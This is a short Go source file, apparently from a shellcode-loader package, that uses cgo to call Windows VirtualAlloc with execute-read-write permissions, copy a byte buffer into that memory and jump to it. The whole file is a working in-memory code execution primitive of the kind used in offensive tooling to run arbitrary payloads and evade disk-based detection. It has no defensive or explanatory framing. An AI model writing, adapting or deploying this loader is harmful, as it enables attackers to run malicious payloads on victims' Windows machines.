package cloader

/*
#include <windows.h>

void direct(uintptr_t p, int len) {
    LPVOID Memory = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(Memory, (void*)p, len);
	((void(*)())Memory)();
}
*/
import "C"
import "unsafe"

func Direct(p []byte) {
	C.direct((C.uintptr_t)(uintptr(unsafe.Pointer(&p[0]))), (C.int)(len(p)))
}
